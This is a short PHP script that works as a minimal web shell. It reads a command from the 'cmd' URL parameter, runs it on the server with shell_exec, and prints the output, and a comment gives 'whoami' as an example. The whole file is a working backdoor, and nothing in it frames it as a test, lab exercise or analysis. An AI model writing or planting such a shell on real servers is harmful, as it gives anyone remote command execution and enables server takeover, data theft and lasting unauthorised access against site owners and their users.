<?php
// Executes a command supplied via a URL parameter (e.g., ?cmd=whoami)
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>